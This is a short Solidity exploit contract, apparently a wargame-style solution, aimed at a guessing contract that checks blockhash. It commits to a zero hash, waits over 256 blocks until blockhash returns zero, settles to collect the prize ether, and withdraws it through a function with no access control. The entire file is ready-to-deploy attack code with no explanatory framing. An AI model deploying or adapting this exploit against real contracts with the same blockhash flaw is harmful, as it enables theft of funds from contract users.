pragma solidity ^0.4.24;

interface IPredict {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
}

contract ExploitPredict {
    IPredict public target;
    uint256 public targetBlock;

    constructor(address _target) public payable {
        require(msg.value == 1 ether, "Need 1 ETH to play");
        target = IPredict(_target);

        // Predict 0x0 which will be returned by blockhash after 256 blocks
        target.lockInGuess.value(1 ether)(bytes32(0));
        targetBlock = block.number + 1;
    }

    function attack() public {
        require(block.number > targetBlock + 256, "Too early; wait 257 blocks");
        target.settle();
        // ETH is now in this contract. Add withdraw if needed.
    }

    // Optional: withdraw ETH
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function () external payable {} // accept ETH
}

